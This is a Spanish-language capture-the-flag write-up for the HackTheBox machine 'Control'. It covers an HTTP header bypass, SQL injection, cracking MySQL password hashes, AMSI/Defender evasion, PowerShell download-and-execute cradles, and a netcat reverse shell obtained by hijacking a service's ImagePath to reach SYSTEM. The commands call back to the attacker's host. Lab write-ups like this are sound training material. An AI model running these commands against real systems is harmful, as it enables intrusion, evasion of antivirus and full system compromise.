---
layout: post
title: Control
date: 2023-02-01
description:
img:
fig-caption:
tags: [ eWPT, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Control-htb/Control_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL - Error Based

* Abuso de permiso de escritura desde la inyección SQL

* Bypass AMSI

* Enumeración con WinPeas

* Hijacking Service ImagePath a través del registro (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.167 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 20:02 GMT
Initiating SYN Stealth Scan at 20:02
Scanning 10.10.10.167 [65535 ports]
Discovered open port 135/tcp on 10.10.10.167
Discovered open port 80/tcp on 10.10.10.167
Discovered open port 3306/tcp on 10.10.10.167
Discovered open port 49667/tcp on 10.10.10.167
Discovered open port 49666/tcp on 10.10.10.167
Completed SYN Stealth Scan at 20:03, 26.35s elapsed (65535 total ports)
Nmap scan report for 10.10.10.167
Host is up, received user-set (0.043s latency).
Scanned at 2023-02-01 20:02:49 GMT for 27s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
3306/tcp  open  mysql   syn-ack ttl 127
49666/tcp open  unknown syn-ack ttl 127
49667/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 23 (1.012KB)
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,135,3306,49666,49667 10.10.10.167 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 20:05 GMT
Nmap scan report for 10.10.10.167
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Fidelity
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.08 seconds
```

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.167
http://10.10.10.167 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.167], JQuery, Microsoft-IIS[10.0], PHP[7.3.7], Script[text/javascript], Title[Fidelity], X-Powered-By[PHP/7.3.7]
```

Al abrirla en el navegador aparece lo siguiente:

<img src="/writeups/assets/img/Control-htb/1.png" alt="">

Si intento acceder a la sección de Admin, me aparece un mensaje diciendo que tengo que pasar por un proxy y que necesito una cabecera. Abro el BurpSuite para hacer pruebas. Al hacer click en login, me redirige también a /admin.php.

<img src="/writeups/assets/img/Control-htb/2.png" alt="">

En el código fuente hay una pista (CTF-like). Quiero pensar que si consigo el certificado SSL podré acceder a ciertos recursos

<img src="/writeups/assets/img/Control-htb/3.png" alt="">

Con wfuzz, aplico fuzzing para descubrir la cabecera. Utilizo los diccionarios de Seclists. Como en el comentario hacía referencia a una IP, puede que si pongo la loopback como IP, el servidor interprete que es una petición autorizada y me permita el acceso. Pero todas las respuestas me devuelven lo mismo. Sin embargo, en el código fuente se podía ver otra IP, que es la autorizada

```null
wfuzz -c -t 30 -w /usr/share/wordlists/SecLists/Miscellaneous/web/http-request-headers/http-request-headers-common-non-standard-fields.txt -H "FUZZ: 192.168.4.28" http://10.10.10.167/admin.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.167/admin.php
Total requests: 34

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000015:   200        0 L      15 W       89 Ch       "PSU-Device-ID"                                                                                                                                 
000000002:   200        0 L      15 W       89 Ch       "Front-End-Https"                                                                                                                               
000000013:   200        0 L      15 W       89 Ch       "PSU-Accept-Language"                                                                                                                           
000000010:   200        0 L      15 W       89 Ch       "PSU-Accept"                                                                                                                                    
000000006:   200        0 L      15 W       89 Ch       "PSU-HTTP-Method"                                                                                                                               
000000012:   200        0 L      15 W       89 Ch       "PSU-Accept-Encoding"                                                                                                                           
000000018:   200        0 L      15 W       89 Ch       "X-Correlation-ID"                                                                                                                              
000000001:   200        0 L      15 W       89 Ch       "DNT"                                                                                                                                           
000000011:   200        0 L      15 W       89 Ch       "PSU-Accept-Charset"                                                                                                                            
000000028:   200        0 L      15 W       89 Ch       "X-Requested-With"                                                                                                                              
000000020:   200        0 L      15 W       89 Ch       "X-XSRF-TOKEN"                                                                                                                                  
000000017:   200        0 L      15 W       89 Ch       "X-CSRFToken"                                                                                                                                   
000000003:   200        0 L      15 W       89 Ch       "Proxy-Connection"                                                                                                                              
000000014:   200        0 L      15 W       89 Ch       "PSU-GEO-Location"                                                                                                                              
000000009:   200        0 L      15 W       89 Ch       "PSU-Referer"                                                                                                                                   
000000016:   200        0 L      15 W       89 Ch       "X-ATT-DeviceId"                                                                                                                                
000000008:   200        0 L      15 W       89 Ch       "PSU-User-Agent"                                                                                                                                
000000005:   200        0 L      15 W       89 Ch       "PSU-IP-Port"                                                                                                                                   
000000024:   200        0 L      15 W       89 Ch       "X-Forwarded-Proto"                                                                                                                             
000000004:   200        0 L      15 W       89 Ch       "PSU-IP-Address"                                                                                                                                
000000034:   200        0 L      15 W       89 Ch       "Cluster-Client-IP"                                                                                                                             
000000032:   200        0 L      15 W       89 Ch       "Client-IP"                                                                                                                                     
000000033:   200        0 L      15 W       89 Ch       "True-Client-IP"                                                                                                                                
000000023:   200        0 L      15 W       89 Ch       "X-Forwarded-Host"                                                                                                                              
000000029:   200        0 L      15 W       89 Ch       "X-UIDH"                                                                                                                                        
000000027:   200        0 L      15 W       89 Ch       "X-Request-ID"                                                                                                                                  
000000030:   200        0 L      15 W       89 Ch       "X-Wap-Profile"                                                                                                                                 
000000026:   200        0 L      15 W       89 Ch       "X-ProxyUser-Ip"                                                                                                                                
000000007:   200        0 L      15 W       89 Ch       "PSU-Date"                                                                                                                                      
000000031:   200        0 L      15 W       89 Ch       "X-XSRF-TOKEN"                                                                                                                                  
000000025:   200        0 L      15 W       89 Ch       "X-Http-Method-Override"                                                                                                                        
000000019:   200        0 L      15 W       89 Ch       "X-Csrf-Token"                                                                                                                                  
000000021:   200        0 L      15 W       89 Ch       "X-Do-Not-Track"                                                                                                                                
000000022:   200        153 L    466 W      7933 Ch     "X-Forwarded-For"                                                                                                                               

Total time: 0.352844
Processed Requests: 34
Filtered Requests: 0
Requests/sec.: 96.35960
```

Desde el BurpSuite, añado una configuración para que cada petición que realice, le agregue esa cabecera.

<img src="/writeups/assets/img/Control-htb/4.png" alt="">

Y carga la web

<img src="/writeups/assets/img/Control-htb/5.png" alt="">

En el campo de búsqueda, introduzco una comilla y me aparece un error de MySQL

<img src="/writeups/assets/img/Control-htb/6.png" alt="">

Me interesa saber cual es el número de columnas. Por tanteo, llego hasta el 6, que no me reporta ningún error en la respuesta

<img src="/writeups/assets/img/Control-htb/7.png" alt="">

Aplico una selección para encontrar los campos vulnerables, y todos lo son

<img src="/writeups/assets/img/Control-htb/8.png" alt="">

Enumero las bases de datos

<img src="/writeups/assets/img/Control-htb/9.png" alt="">

De warehouse, extraigo las columnas, pero no veo nada de interés, así que procedo a enumerar la base de datos mysql

<img src="/writeups/assets/img/Control-htb/10.png" alt="">

Encuentro una columna de usuarios

<img src="/writeups/assets/img/Control-htb/11.png" alt="">

Me quedo con los campos User y Password

<img src="/writeups/assets/img/Control-htb/12.png" alt="">

Y obtengo una contraseña hasheada

<img src="/writeups/assets/img/Control-htb/13.png" alt="">

En total tengo 3 hashes

```null
cat hashes
hector:*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
manager:*CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
root:*0A4A5CAD344718DC418035A1F4D292BA603134D8
```

Obtengo la contraseña del usuario hector

```null
john -w:/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
l33th4x0rhector  (hector)     
1g 0:00:00:01 DONE (2023-02-01 21:00) 0.8620g/s 12363Kp/s 12363Kc/s 30246KC/sa6_123..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

En la página web no hay ningún campo de inicio de sesión funcional. Aparece como que estoy loggeado y si miro las cookies de sesión no hay nada. Como MySQL estaba expuesto externamente, pruebo a conectarme proporcionando esas credenciales

```null
mysql -uhector -p -h10.10.10.167
Enter password: 
ERROR 1130 (HY000): Host '10.10.14.7' is not allowed to connect to this MariaDB server
```

Pero no tengo acceso desde mi IP

Pruebo a tirar de rainbow tables con crackstation, por si la contraseña de alguno de ellos no está en el rockyou.txt, y es el caso

<img src="/writeups/assets/img/Control-htb/14.png" alt="">

Igualmente no tengo acceso, así que solo faltaría probar si tengo capacidad de escritura en alguna ruta del IIS

<img src="/writeups/assets/img/Control-htb/15.png" alt="">

<img src="/writeups/assets/img/Control-htb/16.png" alt="">

Con Invoke-PowerShellTcp.ps1 de nishang, me entablo una reverse shell

Le añado en la última línea el comando que quiero ejecutar una vez se interprete

```null
cat Invoke-PowerShellTcp.ps1 | tail -n1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443
```

Creo la sentencia en powershell que voy a enviar en base64 a un fichero

```null
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

<img src="/writeups/assets/img/Control-htb/17.png" alt="">

Y recibo la petición. Pero hay reglas de firewall implementadas o el Defender está bloqueando la conexión

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.167 - - [01/Feb/2023 21:31:52] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

Para bypassearlo, borro todos los comentarios y le cambio el nombre de la función por otro cualquiera

<img src="/writeups/assets/img/Control-htb/18.png" alt="">

Y gano acceso al sistema

Mirando los privilegios este usuario, veo que tiene SeImpersonatePrivileage

```null
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

No puedo ver de primeras en que versión de Windows estoy

```null
PS C:\> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1 
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException 
    + FullyQualifiedErrorId : NativeCommandFailed
```

Busco por el registro

```null
PS C:\Users\Hector> reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
    ProductName    REG_SZ    Windows Server 2019 Standard
```

Pero no puedo ejecutar comandos con JuicyPotatoNG

```null
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag.
```

Hay un usuario llamado Hector

```null
PS C:\Users> dir 


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                                                                                                            
----                -------------         ------ ----                                                                                                                                                            
d-----         2/1/2023  10:07 PM                Administrator                                                                                                                                                   
d-----        11/1/2019  11:09 AM                Hector                                                                                                                                                          
d-r---       10/21/2019   5:29 PM                Public 
```

Como tengo su contraseña (en caso de que se reutilice), puedo probar a crear unas PSCredentials y ejecutar comandos como este usuario

```null
PS C:\Users\Hector> $Pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force 
PS C:\Users\Hector> $Cred = New-Object System.Automation.PSCredential('WORKGROUP\hector', $Pass)
PS C:\Users\Hector> Invoke-Command -ComputerName localhost -Credential $Cred -ScriptBlock { whoami } 
control\hector
```

De la misma forma que antes, me entablo una reverse shell como Hector

```null
PS C:\Users\Hector> Invoke-Command -ComputerName localhost -Credential $Cred -ScriptBlock { powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFM
AdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA }
```

Puedo visualizar la primera flag

```null
PS C:\Users\Hector\Desktop> type user.txt 
240ad33dee104435e3a5eb106b5a948d 
```

# Escalada

Con WinPeas, aplico reconocimiento

El usuario puede modificar los registros de los servicios

```null
+----------¦ Looking if you can modify any service registry
+ Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\.NET CLR Data (Hector [FullControl])
    HKLM\system\currentcontrolset\services\.NET CLR Networking (Hector [FullControl])
    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Hector [FullControl])
    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Hector [FullControl])
    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Hector [FullControl])
    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Hector [FullControl])

    ...
```

Pruebo a modificar el binPath de uno de ellos pero no tengo acceso

```null
PS C:\Temp> sc.exe config seclogon binPath="C:\Temp\nc.exe"
[SC] OpenService FAILED 5: 

Access is denied.
```

Examino los atributos del registro que corresponde a ese servicio

```null
PS C:\Temp> reg query HKLM\System\CurrentControlSet\Services\seclogon

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon 
    Description    REG_SZ    @%SystemRoot%\system32\seclogon.dll,-7000
    DisplayName    REG_SZ    @%SystemRoot%\system32\seclogon.dll,-7001
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    805101000000000000000000030000001400000001000000C0D4010001000000E09304000000000000000000
    ImagePath    REG_EXPAND_SZ    %windir%\system32\svchost.exe -k netsvcs -p
    ObjectName    REG_SZ    LocalSystem
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\0SeRestorePrivilege\0SeBackupPrivilege\0SeAssignPrimaryTokenPrivilege\0SeIncreaseQuotaPrivilege\0SeImpersonatePrivilege
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon\Parameters
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon\Security
```

No tiene el binPath típico, sino que hay otro llamado ImagePath

Modifico directamente el registro

```null
PS C:\Temp> reg add HKLM\System\CurrentControlSet\Services\seclogon /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\nc.exe -e cmd 10.10.14.7 443" /f
The operation completed successfully. 
```

Inicio el servicio

```null
PS C:\Temp> sc.exe start seclogon
```

Y gano acceso en una sesión de netcat

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.167.
Ncat: Connection from 10.10.10.167:49761.
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Puedo visualizar la segunda flag

```null
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
34502f22263c6dd4e8c60d8a4b456853
```